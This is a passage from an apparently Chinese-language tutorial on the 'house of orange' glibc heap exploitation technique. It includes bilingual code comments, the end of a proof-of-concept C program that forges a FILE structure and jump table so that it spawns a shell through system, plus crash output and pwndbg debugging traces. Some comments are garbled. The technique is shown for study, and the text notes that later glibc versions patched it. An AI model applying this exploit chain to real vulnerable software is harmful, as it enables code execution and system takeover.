          The function _IO_flush_all_lockp iterates through the file pointer linked-list
          in _IO_list_all.
          //由于我们仅仅可以通过main_arena的unsorted-bin-list来覆写这个地址,因此方法就时在对应的fd-ptr处控制内存
          Since we can only overwrite this address with main_arena's unsorted-bin-list,
          the idea is to get control over the memory at the corresponding fd-ptr.
          //下一个file指针在bass_address+0x68的位置
          The address of the next file pointer is located at base_address+0x68.
          //这个相对应的是smallbin-4,存储在90到98之间的smallbin的地方
          This corresponds to smallbin-4, which holds all the smallbins of
          sizes between 90 and 98. For further information about the libc's bin organisation
          see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/
          //由于我们溢出了旧的top chunk,我们也就可以控制他的size域了
          Since we overflow the old top chunk, we also control it's size field.
          //这也就会有一个棘手的问题,我们的old top chunk现在是在unsorted bin list中的,在每个分配中,malloc都会尝试首先为该列表中的chunk来提供服务
          //因此这也将会遍历该链表
          Here it gets a little bit tricky, currently the old top chunk is in the
          unsortedbin list. For each allocation, malloc tries to serve the chunks
          in this list first, therefore, iterates over the list.
          //此外,他也会把排序所有不符合的chunk并插入到对应的bins中去
          Furthermore, it will sort all non-fitting chunks into the corresponding bins.
          //如果我们设置size为0x61并且触发一个不合适的更小的申请,malloc将会把old chunk放入到small bin-4中去
          If we set the size to 0x61 (97) (prev_inuse bit has to be set)
          and trigger an non fitting smaller allocation, malloc will sort the old chunk into the
          //由于这个bin现在是空的,因此old top chunk将会变成新的头部
          smallbin-4. Since this bin is currently empty the old top chunk will be the new head,
          //因此,old top chunk占据了main_arena中smallbin[4]的位置,并最终代表了fake file的fd-pter指针
          therefore, occupying the smallbin[4] location in the main_arena and
          eventually representing the fake file pointer's fd-ptr.
          //除了分类外,malloc也会对他们做一些某些大小的检查
          In addition to sorting, malloc will also perform certain size checks on them,
          //所以在分类old_top chunk和在伪造的fd指针指向_IO_list_all之后,他将会检查size域,检查 size是否小于最小的"size_mode _IO_write_ptr > fp->_IO_write_base
        */
        _IO_FILE *fp = (_IO_FILE *) top;
        /*
          1. Set mode to 0: fp->_mode _mode = 0; // top+0xc0
        /*
          2. Set write_base to 2 and write_ptr to 3: fp->_IO_write_ptr > fp->_IO_write_base
        */
        fp->_IO_write_base = (char *) 2; // top+0x20
        fp->_IO_write_ptr = (char *) 3; // top+0x28
        /*
         //最后我们设置jump table去控制内存并将system放到这儿
          4) Finally set the jump table to controlled memory and place system there.
          //jump_table指针是正好在_IO_FILE结构体后面的
          The jump table pointer is right after the _IO_FILE struct:
          base_address+sizeof(_IO_FILE) = jump_table
             4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner
        */
        size_t *jump_table = &top[12]; // controlled memory
        jump_table[3] = (size_t) &winner;
        *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8
        //现在让我们用malloc来触发整个链
        /* Finally, trigger the whole chain by calling malloc */
        malloc(10);
       /*
         The libc's error message will be printed to the screen
         But you'll get a shell anyways.
       */
        return 0;
    }
    int winner(char *ptr)
    {
        system(ptr);
        return 0;
    }
###  运行结果
    The attack vector of this technique was removed by changing the behavior of malloc_printerr, which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).
    Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51
    *** Error in `./house_of_orange': malloc(): memory corruption: 0x00007f83ceb58520 ***
    ======= Backtrace: =========
    /lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f83ce80a7e5]
    /lib/x86_64-linux-gnu/libc.so.6(+0x8213e)[0x7f83ce81513e]
    /lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f83ce817184]
    ./house_of_orange[0x400788]
    /lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f83ce7b3830]
    ./house_of_orange[0x400589]
    ======= Memory map: ========
    00400000-00401000 r-xp 00000000 fd:01 742055                             /root/how2heap/glibc_2.25/house_of_orange
    00600000-00601000 r--p 00000000 fd:01 742055                             /root/how2heap/glibc_2.25/house_of_orange
    00601000-00602000 rw-p 00001000 fd:01 742055                             /root/how2heap/glibc_2.25/house_of_orange
    009a8000-009eb000 rw-p 00000000 00:00 0                                  [heap]
    7f83c8000000-7f83c8021000 rw-p 00000000 00:00 0
    7f83c8021000-7f83cc000000 ---p 00000000 00:00 0
    7f83ce57d000-7f83ce593000 r-xp 00000000 fd:01 1839004                    /lib/x86_64-linux-gnu/libgcc_s.so.1
    7f83ce593000-7f83ce792000 ---p 00016000 fd:01 1839004                    /lib/x86_64-linux-gnu/libgcc_s.so.1
    7f83ce792000-7f83ce793000 rw-p 00015000 fd:01 1839004                    /lib/x86_64-linux-gnu/libgcc_s.so.1
    7f83ce793000-7f83ce953000 r-xp 00000000 fd:01 1838983                    /lib/x86_64-linux-gnu/libc-2.23.so
    7f83ce953000-7f83ceb53000 ---p 001c0000 fd:01 1838983                    /lib/x86_64-linux-gnu/libc-2.23.so
    7f83ceb53000-7f83ceb57000 r--p 001c0000 fd:01 1838983                    /lib/x86_64-linux-gnu/libc-2.23.so
    7f83ceb57000-7f83ceb59000 rw-p 001c4000 fd:01 1838983                    /lib/x86_64-linux-gnu/libc-2.23.so
    7f83ceb59000-7f83ceb5d000 rw-p 00000000 00:00 0
    7f83ceb5d000-7f83ceb83000 r-xp 00000000 fd:01 1838963                    /lib/x86_64-linux-gnu/ld-2.23.so
    7f83ced75000-7f83ced78000 rw-p 00000000 00:00 0
    7f83ced81000-7f83ced82000 rw-p 00000000 00:00 0
    7f83ced82000-7f83ced83000 r--p 00025000 fd:01 1838963                    /lib/x86_64-linux-gnu/ld-2.23.so
    7f83ced83000-7f83ced84000 rw-p 00026000 fd:01 1838963                    /lib/x86_64-linux-gnu/ld-2.23.so
    7f83ced84000-7f83ced85000 rw-p 00000000 00:00 0
    7ffd29f33000-7ffd29f54000 rw-p 00000000 00:00 0                          [stack]
    7ffd29fb3000-7ffd29fb5000 r-xp 00000000 00:00 0                          [vdso]
    ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
    # ls
    a.out                      fastbin_dup_into_stack.c  house_of_force.c  house_of_orange.c  large_bin_attack.c    overlapping_chunks_2.c  unsafe_unlink          unsorted_bin_into_stack
    fastbin_dup_consolidate    house_of_einherjar        house_of_lore     house_of_spirit    overlapping_chunks    poison_null_byte        unsafe_unlink.c        unsorted_bin_into_stack.c
    fastbin_dup_consolidate.c  house_of_einherjar.c      house_of_lore.c   house_of_spirit.c  overlapping_chunks.c  poison_null_byte.c      unsorted_bin_attack
    fastbin_dup_into_stack     house_of_force            house_of_orange   large_bin_attack   overlapping_chunks_2  un2.c                   unsorted_bin_attack.c
###  调试
断点如下:
     ► 72     top = (size_t *) ( (char *) p1 + 0x400 - 16);
       73     top[1] = 0xc01;
       118
     ► 119     p2 = malloc(0x1000);
     ► 155     io_list_all = top[2] + 0x9a8;
     ► 172     top[3] = io_list_all - 0x10;
     ► 179     memcpy( ( char *) top, "/bin/shx00", 8);
     ► 211     top[1] = 0x61;
     ► 222     _IO_FILE *fp = (_IO_FILE *) top;
     ► 229     fp->_mode = 0; // top+0xc0
     ► 236     fp->_IO_write_base = (char *) 2; // top+0x20
       237     fp->_IO_write_ptr = (char *) 3; // top+0x28
     ► 248     size_t *jump_table = &top[12]; // controlled memory
       249     jump_table[3] = (size_t) &winner;
       250     *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8
     ► 254     malloc(10);
首先程序分配了p1(0x400-16),此时的堆和top chunk
    pwndbg> x/10gx 0x602400
    0x602400:       0x0000000000000000      0x0000000000020c01
    0x602410:       0x0000000000000000      0x0000000000000000
    0x602420:       0x0000000000000000      0x0000000000000000
    0x602430:       0x0000000000000000      0x0000000000000000
    0x602440:       0x0000000000000000      0x0000000000000000
然后我们把top_chunk的size伪造成0xc01
    pwndbg> x/10gx 0x602400
    0x602400:       0x0000000000000000      0x0000000000000c01
    0x602410:       0x0000000000000000      0x0000000000000000
    0x602420:       0x0000000000000000      0x0000000000000000
    0x602430:       0x0000000000000000      0x0000000000000000
    0x602440:       0x0000000000000000      0x0000000000000000
下面申请一个较大的chunk p2
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x602400 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602400
    smallbins
    empty
    largebins
    empty
这个时候可以看到我们的旧top chunk已经被放到了unsorted bin中下面
紧接着程序计算了IO_LIST_ALL的地址
    pwndbg> p/x &_IO_list_all
    $7 = 0x7ffff7dd2520
    pwndbg> p/x io_list_all
    $8 = 0x7ffff7dd2520
并将old chunk的bk指针指向了_io_list_ptr-0x10
然后给top的前八个字节设为了”/bin/shx00”
    pwndbg> x/10gx 0x602400
    0x602400:       0x0068732f6e69622f      0x0000000000000be1
    0x602410:       0x00007ffff7dd1b78      0x00007ffff7dd2510
    0x602420:       0x0000000000000000      0x0000000000000000
    0x602430:       0x0000000000000000      0x0000000000000000
    0x602440:       0x0000000000000000      0x0000000000000000
    01:0008│      0x7fffffffe618 —▸ 0x602400 ◂— 0x68732f6e69622f /* '/bin/sh' */
现在我们把size设为0x61
    pwndbg> x/10gx 0x602400
    0x602400:       0x0068732f6e69622f      0x0000000000000061
    0x602410:       0x00007ffff7dd1b78      0x00007ffff7dd2510
    0x602420:       0x0000000000000000      0x0000000000000000
    0x602430:       0x0000000000000000      0x0000000000000000
    0x602440:       0x0000000000000000      0x0000000000000000
之后程序对我们的旧的top chunk做了对绕过检测的改写,先将mode改为0
    $20 = {
      _flags = 1852400175,
      _IO_read_ptr = 0x61 ,
      _IO_read_end = 0x7ffff7dd1b78  "20@b",
      _IO_read_base = 0x7ffff7dd2510 "",
      _IO_write_base = 0x0,
      _IO_write_ptr = 0x0,
      _IO_write_end = 0x0,
      _IO_buf_base = 0x0,
      _IO_buf_end = 0x0,
      _IO_save_base = 0x0,
      _IO_backup_base = 0x0,
      _IO_save_end = 0x0,
      _markers = 0x0,
      _chain = 0x0,